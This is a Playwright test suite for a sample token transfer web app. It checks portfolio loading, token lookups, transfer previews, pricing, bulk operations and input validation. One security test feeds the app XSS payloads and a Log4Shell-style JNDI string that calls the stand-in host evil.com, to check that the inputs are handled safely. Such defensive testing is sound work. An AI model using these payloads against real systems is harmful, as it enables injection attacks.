/**
 * Comprehensive Functionality Tests for Token Transfer Web App
 * Tests portfolio management, token operations, transfer capabilities, and pricing
 */

const { test, expect } = require('@playwright/test');

test.describe('Token Transfer - Functionality Tests', () => {
  let page;

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage();
    await page.goto('http://localhost:8888/samples/token-transfer/');
    await page.waitForLoadState('networkidle');
    await page.waitForTimeout(3000);
  });

  test.afterEach(async () => {
    await page.close();
  });

  describe('Application Initialization', () => {
    test('should load Token Transfer interface', async () => {
      // Check main elements
      await expect(page.locator('.app-container')).toBeVisible();
      await expect(page.locator('.app-header h1')).toContainText('Token Transfer');
      
      // Check network selector
      await expect(page.locator('#networkSelect')).toBeVisible();
      
      // Check main sections
      await expect(page.locator('.portfolio-section')).toBeVisible();
      await expect(page.locator('.token-operations')).toBeVisible();
      await expect(page.locator('.transfer-section')).toBeVisible();
    });

    test('should initialize SDK and show status', async () => {
      await page.waitForTimeout(5000);
      
      const statusIndicator = page.locator('.status-indicator');
      if (await statusIndicator.isVisible()) {
        const statusText = await statusIndicator.textContent();
        expect(statusText).toMatch(/connected|initialized|ready/i);
      }
      
      const networkSelect = page.locator('#networkSelect');
      const networkValue = await networkSelect.inputValue();
      expect(['testnet', 'mainnet']).toContain(networkValue);
    });

    test('should handle network switching', async () => {
      const networkSelect = page.locator('#networkSelect');
      
      await networkSelect.selectOption('mainnet');
      await page.waitForTimeout(3000);
      expect(await networkSelect.inputValue()).toBe('mainnet');
      
      await networkSelect.selectOption('testnet');
      await page.waitForTimeout(3000);
      expect(await networkSelect.inputValue()).toBe('testnet');
    });
  });

  describe('Portfolio Loading and Management', () => {
    test('should load portfolio for identity', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await loadPortfolioBtn.click();
      
      await page.waitForTimeout(15000);
      
      // Check portfolio display
      const portfolioDisplay = page.locator('.portfolio-display, .portfolio-results');
      if (await portfolioDisplay.isVisible()) {
        const portfolioText = await portfolioDisplay.textContent();
        
        expect(portfolioText).toMatch(/portfolio|tokens|balance|holdings/i);
        
        // If tokens found, should show token information
        if (portfolioText.toLowerCase().includes('token')) {
          expect(portfolioText).toMatch(/name|symbol|balance|amount/i);
        }
      }
    });

    test('should handle empty portfolios', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      // Use identity that likely has no tokens
      await portfolioInput.fill('EmptyPortfolio123456789AbCdEf123456789AbCdEf');
      await loadPortfolioBtn.click();
      
      await page.waitForTimeout(15000);
      
      const portfolioDisplay = page.locator('.portfolio-display');
      if (await portfolioDisplay.isVisible()) {
        const portfolioText = await portfolioDisplay.textContent();
        
        // Should handle empty portfolio gracefully
        expect(portfolioText).toMatch(/empty|no.*tokens|no.*holdings/i);
      }
    });

    test('should display token details in portfolio', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await loadPortfolioBtn.click();
      await page.waitForTimeout(15000);
      
      // Check for token item structure
      const tokenItems = page.locator('.token-item, .portfolio-token');
      const tokenCount = await tokenItems.count();
      
      if (tokenCount > 0) {
        const firstToken = tokenItems.first();
        const tokenText = await firstToken.textContent();
        
        // Should show token metadata
        expect(tokenText).toMatch(/name|symbol|balance|contract|id/i);
        
        // Should show numeric balance
        expect(tokenText).toMatch(/\d+/);
      }
    });

    test('should handle portfolio loading with Enter key', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      
      await portfolioInput.press('Enter');
      await page.waitForTimeout(12000);
      
      const portfolioDisplay = page.locator('.portfolio-display');
      if (await portfolioDisplay.isVisible()) {
        const portfolioText = await portfolioDisplay.textContent();
        expect(portfolioText.length).toBeGreaterThan(0);
      }
    });

    test('should calculate portfolio total value', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await loadPortfolioBtn.click();
      await page.waitForTimeout(15000);
      
      // Check for total value display
      const totalValue = page.locator('.total-value, .portfolio-total');
      if (await totalValue.isVisible()) {
        const valueText = await totalValue.textContent();
        
        expect(valueText).toMatch(/total|value|worth/i);
        expect(valueText).toMatch(/\d+/);
      }
    });
  });

  describe('Token ID Calculation', () => {
    test('should calculate token ID from parameters', async () => {
      const contractInput = page.locator('#tokenContractId, #contractId');
      const documentTypeInput = page.locator('#documentType, #tokenDocumentType');
      const calculateTokenIdBtn = page.locator('#calculateTokenIdBtn');
      
      if (await calculateTokenIdBtn.isVisible()) {
        await contractInput.fill('Hqyu8WcRwXCTwbNxdga4CN5gsVEGc67wng4TFzceyLUv');
        
        if (await documentTypeInput.isVisible()) {
          await documentTypeInput.fill('token');
        }
        
        await calculateTokenIdBtn.click();
        await page.waitForTimeout(5000);
        
        // Check token ID result
        const tokenIdResult = page.locator('.token-id-result, .calculated-token-id');
        if (await tokenIdResult.isVisible()) {
          const resultText = await tokenIdResult.textContent();
          
          expect(resultText).toMatch(/token.*id|calculated|result/i);
          expect(resultText).toMatch(/[A-Za-z0-9]{44,}/); // Base58 pattern
        }
      }
    });

    test('should validate token calculation inputs', async () => {
      const contractInput = page.locator('#tokenContractId, #contractId');
      const calculateTokenIdBtn = page.locator('#calculateTokenIdBtn');
      
      if (await calculateTokenIdBtn.isVisible()) {
        // Try with invalid contract ID
        await contractInput.fill('invalid-contract-id');
        await calculateTokenIdBtn.click();
        await page.waitForTimeout(3000);
        
        // Should show validation error
        const errorMessage = page.locator('.error-message, .validation-error');
        if (await errorMessage.isVisible()) {
          const errorText = await errorMessage.textContent();
          expect(errorText).toMatch(/invalid|error|malformed/i);
        }
      }
    });

    test('should handle empty calculation inputs', async () => {
      const calculateTokenIdBtn = page.locator('#calculateTokenIdBtn');
      
      if (await calculateTokenIdBtn.isVisible()) {
        // Try calculation without inputs
        await calculateTokenIdBtn.click();
        await page.waitForTimeout(3000);
        
        const errorMessage = page.locator('.error-message');
        if (await errorMessage.isVisible()) {
          const errorText = await errorMessage.textContent();
          expect(errorText).toMatch(/required|empty|missing/i);
        }
      }
    });
  });

  describe('Direct Token Information', () => {
    test('should get token information by ID', async () => {
      const tokenIdInput = page.locator('#directTokenId, #tokenId');
      const getTokenInfoBtn = page.locator('#getTokenInfoBtn');
      
      if (await getTokenInfoBtn.isVisible()) {
        // Use a potentially valid token ID
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await getTokenInfoBtn.click();
        
        await page.waitForTimeout(10000);
        
        // Check token information display
        const tokenInfo = page.locator('.token-info, .token-details');
        if (await tokenInfo.isVisible()) {
          const infoText = await tokenInfo.textContent();
          
          expect(infoText).toMatch(/token|name|symbol|supply|contract/i);
          
          // If token found, should show details
          if (infoText.toLowerCase().includes('name')) {
            expect(infoText).toMatch(/name|symbol|description/i);
          }
        }
      }
    });

    test('should handle non-existent token IDs', async () => {
      const tokenIdInput = page.locator('#directTokenId, #tokenId');
      const getTokenInfoBtn = page.locator('#getTokenInfoBtn');
      
      if (await getTokenInfoBtn.isVisible()) {
        await tokenIdInput.fill('NonExistentToken123456789AbCdEf123456789');
        await getTokenInfoBtn.click();
        
        await page.waitForTimeout(8000);
        
        const tokenInfo = page.locator('.token-info');
        if (await tokenInfo.isVisible()) {
          const infoText = await tokenInfo.textContent();
          expect(infoText).toMatch(/not.*found|does.*not.*exist|error/i);
        }
      }
    });

    test('should display token metadata correctly', async () => {
      const tokenIdInput = page.locator('#directTokenId, #tokenId');
      const getTokenInfoBtn = page.locator('#getTokenInfoBtn');
      
      if (await getTokenInfoBtn.isVisible()) {
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await getTokenInfoBtn.click();
        await page.waitForTimeout(10000);
        
        const tokenInfo = page.locator('.token-info');
        if (await tokenInfo.isVisible()) {
          const infoText = await tokenInfo.textContent();
          
          // Check for structured token metadata
          const hasMetadata = await page.locator('.token-metadata, .token-properties').isVisible();
          if (hasMetadata) {
            expect(infoText).toMatch(/name|symbol|decimals|supply|description/i);
          }
        }
      }
    });
  });

  describe('Token Transfer Operations', () => {
    test('should show transfer preview', async () => {
      const fromInput = page.locator('#fromIdentityId, #transferFromId');
      const toInput = page.locator('#toIdentityId, #transferToId');
      const tokenIdInput = page.locator('#transferTokenId');
      const amountInput = page.locator('#transferAmount');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await previewTransferBtn.isVisible()) {
        await fromInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await toInput.fill('RecipientIdentity123456789AbCdEf123456789AbCd');
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await amountInput.fill('10');
        
        await previewTransferBtn.click();
        await page.waitForTimeout(8000);
        
        // Check transfer preview
        const transferPreview = page.locator('.transfer-preview, #transferPreview');
        if (await transferPreview.isVisible()) {
          const previewText = await transferPreview.textContent();
          
          expect(previewText).toMatch(/preview|transfer|from|to|amount|fee/i);
          expect(previewText).toContain('10'); // Amount
        }
      }
    });

    test('should validate transfer parameters', async () => {
      const fromInput = page.locator('#fromIdentityId, #transferFromId');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await previewTransferBtn.isVisible()) {
        // Try preview without required fields
        await fromInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await previewTransferBtn.click();
        await page.waitForTimeout(5000);
        
        // Should show validation errors
        const errorMessage = page.locator('.error-message, .validation-error');
        if (await errorMessage.isVisible()) {
          const errorText = await errorMessage.textContent();
          expect(errorText).toMatch(/required|missing|invalid/i);
        }
      }
    });

    test('should calculate transfer fees', async () => {
      const fromInput = page.locator('#fromIdentityId, #transferFromId');
      const toInput = page.locator('#toIdentityId, #transferToId');
      const tokenIdInput = page.locator('#transferTokenId');
      const amountInput = page.locator('#transferAmount');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await previewTransferBtn.isVisible()) {
        await fromInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await toInput.fill('RecipientIdentity123456789AbCdEf123456789AbCd');
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await amountInput.fill('100');
        
        await previewTransferBtn.click();
        await page.waitForTimeout(8000);
        
        const transferPreview = page.locator('.transfer-preview');
        if (await transferPreview.isVisible()) {
          const previewText = await transferPreview.textContent();
          
          // Should show fee calculation
          expect(previewText).toMatch(/fee|cost|total|network/i);
        }
      }
    });

    test('should handle transfer execution', async () => {
      const fromInput = page.locator('#fromIdentityId, #transferFromId');
      const toInput = page.locator('#toIdentityId, #transferToId');
      const tokenIdInput = page.locator('#transferTokenId');
      const amountInput = page.locator('#transferAmount');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await previewTransferBtn.isVisible()) {
        await fromInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await toInput.fill('RecipientIdentity123456789AbCdEf123456789AbCd');
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await amountInput.fill('1');
        
        await previewTransferBtn.click();
        await page.waitForTimeout(8000);
        
        // Check for execute button in preview
        const executeTransferBtn = page.locator('#executeTransferBtn');
        if (await executeTransferBtn.isVisible()) {
          // Note: In a real test, you might not want to actually execute
          // This just tests that the button is available
          await expect(executeTransferBtn).toBeVisible();
          
          const buttonText = await executeTransferBtn.textContent();
          expect(buttonText).toMatch(/execute|send|transfer|confirm/i);
        }
      }
    });

    test('should handle transfer cancellation', async () => {
      const fromInput = page.locator('#fromIdentityId, #transferFromId');
      const toInput = page.locator('#toIdentityId, #transferToId');
      const tokenIdInput = page.locator('#transferTokenId');
      const amountInput = page.locator('#transferAmount');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await previewTransferBtn.isVisible()) {
        await fromInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await toInput.fill('RecipientIdentity123456789AbCdEf123456789AbCd');
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await amountInput.fill('5');
        
        await previewTransferBtn.click();
        await page.waitForTimeout(8000);
        
        // Cancel transfer
        const cancelTransferBtn = page.locator('#cancelTransferBtn');
        if (await cancelTransferBtn.isVisible()) {
          await cancelTransferBtn.click();
          
          // Preview should be hidden
          const transferPreview = page.locator('.transfer-preview, #transferPreview');
          await expect(transferPreview).not.toBeVisible();
        }
      }
    });
  });

  describe('Pricing and Market Data', () => {
    test('should get token pricing information', async () => {
      const tokenIdInput = page.locator('#pricingTokenId, #tokenId');
      const getPricingBtn = page.locator('#getPricingBtn');
      
      if (await getPricingBtn.isVisible()) {
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await getPricingBtn.click();
        
        await page.waitForTimeout(8000);
        
        // Check pricing display
        const pricingDisplay = page.locator('.pricing-display, .token-pricing');
        if (await pricingDisplay.isVisible()) {
          const pricingText = await pricingDisplay.textContent();
          
          expect(pricingText).toMatch(/price|cost|rate|value|market/i);
          
          // Should show pricing data
          if (pricingText.toLowerCase().includes('price')) {
            expect(pricingText).toMatch(/\d+/);
          }
        }
      }
    });

    test('should handle pricing for non-traded tokens', async () => {
      const tokenIdInput = page.locator('#pricingTokenId, #tokenId');
      const getPricingBtn = page.locator('#getPricingBtn');
      
      if (await getPricingBtn.isVisible()) {
        await tokenIdInput.fill('NonTradedToken123456789AbCdEf123456789AbC');
        await getPricingBtn.click();
        
        await page.waitForTimeout(8000);
        
        const pricingDisplay = page.locator('.pricing-display');
        if (await pricingDisplay.isVisible()) {
          const pricingText = await pricingDisplay.textContent();
          
          // Should handle non-traded tokens appropriately
          expect(pricingText).toMatch(/not.*available|no.*price|not.*traded/i);
        }
      }
    });

    test('should display pricing history if available', async () => {
      const tokenIdInput = page.locator('#pricingTokenId, #tokenId');
      const getPricingBtn = page.locator('#getPricingBtn');
      
      if (await getPricingBtn.isVisible()) {
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await getPricingBtn.click();
        await page.waitForTimeout(8000);
        
        // Check for pricing history
        const pricingHistory = page.locator('.pricing-history, .price-chart');
        if (await pricingHistory.isVisible()) {
          const historyText = await pricingHistory.textContent();
          expect(historyText).toMatch(/history|chart|trend|24h|change/i);
        }
      }
    });
  });

  describe('Bulk Operations', () => {
    test('should perform bulk balance checks', async () => {
      const bulkIdentitiesInput = page.locator('#bulkIdentityIds, #bulkIdentities');
      const bulkBalanceBtn = page.locator('#bulkBalanceBtn');
      
      if (await bulkBalanceBtn.isVisible()) {
        // Enter multiple identity IDs
        const identities = [
          '5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk',
          '8WFWpLyWYtXDHw9kaqj5Rc5Xac5WKFZF8GZrUbLjMbmz'
        ].join('\n');
        
        await bulkIdentitiesInput.fill(identities);
        await bulkBalanceBtn.click();
        
        await page.waitForTimeout(20000);
        
        // Check bulk results
        const bulkResults = page.locator('.bulk-results, .bulk-balance-results');
        if (await bulkResults.isVisible()) {
          const resultsText = await bulkResults.textContent();
          
          expect(resultsText).toMatch(/identity|balance|results/i);
          
          // Should show results for multiple identities
          const resultItems = page.locator('.bulk-result-item, .identity-result');
          const itemCount = await resultItems.count();
          expect(itemCount).toBeGreaterThanOrEqual(1);
        }
      }
    });

    test('should handle bulk operation errors gracefully', async () => {
      const bulkIdentitiesInput = page.locator('#bulkIdentityIds, #bulkIdentities');
      const bulkBalanceBtn = page.locator('#bulkBalanceBtn');
      
      if (await bulkBalanceBtn.isVisible()) {
        // Include invalid identity IDs in bulk operation
        const identities = [
          '5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk',
          'invalid-identity-id',
          'another-invalid-id'
        ].join('\n');
        
        await bulkIdentitiesInput.fill(identities);
        await bulkBalanceBtn.click();
        
        await page.waitForTimeout(15000);
        
        const bulkResults = page.locator('.bulk-results');
        if (await bulkResults.isVisible()) {
          const resultsText = await bulkResults.textContent();
          
          // Should handle mixed valid/invalid results
          expect(resultsText).toMatch(/results|error|not.*found|valid/i);
        }
      }
    });

    test('should export bulk results', async () => {
      const bulkIdentitiesInput = page.locator('#bulkIdentityIds, #bulkIdentities');
      const bulkBalanceBtn = page.locator('#bulkBalanceBtn');
      
      if (await bulkBalanceBtn.isVisible()) {
        await bulkIdentitiesInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
        await bulkBalanceBtn.click();
        
        await page.waitForTimeout(15000);
        
        // Check for export button
        const exportBulkBtn = page.locator('#exportBulkBtn');
        if (await exportBulkBtn.isVisible()) {
          // Set up download listener
          const downloadPromise = page.waitForEvent('download');
          
          await exportBulkBtn.click();
          
          const download = await downloadPromise;
          expect(download.suggestedFilename()).toMatch(/bulk.*results.*\.(json|csv)$/);
        }
      }
    });
  });

  describe('User Interface and Experience', () => {
    test('should provide clear loading states', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await loadPortfolioBtn.click();
      
      // Check for loading state
      await page.waitForTimeout(1000);
      const loadingIndicator = page.locator('.loading, .spinner, .loading-portfolio');
      
      if (await loadingIndicator.isVisible()) {
        expect(await loadingIndicator.isVisible()).toBe(true);
      }
      
      await page.waitForTimeout(12000);
    });

    test('should handle form validation feedback', async () => {
      const amountInput = page.locator('#transferAmount');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await amountInput.isVisible() && await previewTransferBtn.isVisible()) {
        // Enter negative amount
        await amountInput.fill('-10');
        await previewTransferBtn.click();
        await page.waitForTimeout(3000);
        
        // Should show validation feedback
        const validationError = page.locator('.validation-error, .error-message');
        if (await validationError.isVisible()) {
          const errorText = await validationError.textContent();
          expect(errorText).toMatch(/invalid|negative|positive|amount/i);
        }
      }
    });

    test('should be responsive to different viewport sizes', async () => {
      // Test mobile viewport
      await page.setViewportSize({ width: 375, height: 667 });
      await page.waitForTimeout(1000);
      
      const appContainer = page.locator('.app-container');
      await expect(appContainer).toBeVisible();
      
      // Key elements should be accessible
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      await expect(portfolioInput).toBeVisible();
      await expect(loadPortfolioBtn).toBeVisible();
      
      // Test desktop
      await page.setViewportSize({ width: 1920, height: 1080 });
      await page.waitForTimeout(1000);
      
      await expect(appContainer).toBeVisible();
    });

    test('should maintain state across operations', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      // Load portfolio
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await loadPortfolioBtn.click();
      await page.waitForTimeout(15000);
      
      // Input should retain value
      const inputValue = await portfolioInput.inputValue();
      expect(inputValue).toBe('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      
      // Try different operation
      const tokenIdInput = page.locator('#directTokenId, #tokenId');
      const getTokenInfoBtn = page.locator('#getTokenInfoBtn');
      
      if (await getTokenInfoBtn.isVisible()) {
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await getTokenInfoBtn.click();
        await page.waitForTimeout(8000);
        
        // Previous input should still be there
        const portfolioValue = await portfolioInput.inputValue();
        expect(portfolioValue).toBe('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      }
    });
  });

  describe('Error Handling and Security', () => {
    test('should handle malformed input safely', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"><script>alert(1)</script>',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com/a}'
      ];
      
      for (const input of maliciousInputs) {
        await portfolioInput.fill(input);
        await loadPortfolioBtn.click();
        await page.waitForTimeout(3000);
        
        // Should handle without breaking or executing code
        const isPageWorking = await page.locator('.app-container').isVisible();
        expect(isPageWorking).toBe(true);
        
        // No alerts should execute
        const alertsCount = await page.evaluate(() => {
          return typeof window.__alertCount !== 'undefined' ? window.__alertCount : 0;
        });
        expect(alertsCount).toBe(0);
      }
    });

    test('should handle network timeouts gracefully', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      
      // Use ID that might cause timeout
      await portfolioInput.fill('SlowResponsePortfolio123456789AbCdEf123456');
      await loadPortfolioBtn.click();
      
      // Wait extended period
      await page.waitForTimeout(25000);
      
      // Should show either results or error
      const portfolioDisplay = page.locator('.portfolio-display');
      const errorMessage = page.locator('.error-message');
      
      const hasResults = await portfolioDisplay.isVisible();
      const hasError = await errorMessage.isVisible();
      
      expect(hasResults || hasError).toBe(true);
      
      if (hasError) {
        const errorText = await errorMessage.textContent();
        expect(errorText).toMatch(/timeout|network|error|failed/i);
      }
    });

    test('should validate transfer amounts', async () => {
      const amountInput = page.locator('#transferAmount');
      const previewTransferBtn = page.locator('#previewTransferBtn');
      
      if (await amountInput.isVisible()) {
        const invalidAmounts = ['0', '-1', 'abc', '', '999999999999'];
        
        for (const amount of invalidAmounts) {
          await amountInput.fill(amount);
          
          if (await previewTransferBtn.isVisible()) {
            await previewTransferBtn.click();
            await page.waitForTimeout(3000);
            
            // Should validate amounts
            const validationError = page.locator('.validation-error, .error-message');
            if (await validationError.isVisible()) {
              const errorText = await validationError.textContent();
              
              if (amount === '0' || amount === '-1') {
                expect(errorText).toMatch(/positive|greater.*than.*zero/i);
              } else if (amount === 'abc') {
                expect(errorText).toMatch(/numeric|number|invalid/i);
              } else if (amount === '') {
                expect(errorText).toMatch(/required|empty/i);
              }
            }
          }
        }
      }
    });

    test('should handle concurrent operations', async () => {
      const portfolioInput = page.locator('#portfolioIdentityId');
      const loadPortfolioBtn = page.locator('#loadPortfolioBtn');
      const tokenIdInput = page.locator('#directTokenId, #tokenId');
      const getTokenInfoBtn = page.locator('#getTokenInfoBtn');
      
      // Start multiple operations
      await portfolioInput.fill('5DbLwAxGBzUzo81VewMUwn4b5P4bpv9FNFybi25XB5Bk');
      await loadPortfolioBtn.click();
      
      await page.waitForTimeout(1000);
      
      if (await getTokenInfoBtn.isVisible()) {
        await tokenIdInput.fill('TestToken123456789AbCdEf123456789AbCdEf12');
        await getTokenInfoBtn.click();
      }
      
      // Wait for operations to complete
      await page.waitForTimeout(20000);
      
      // Should handle concurrent requests without breaking
      const appContainer = page.locator('.app-container');
      await expect(appContainer).toBeVisible();
    });
  });
});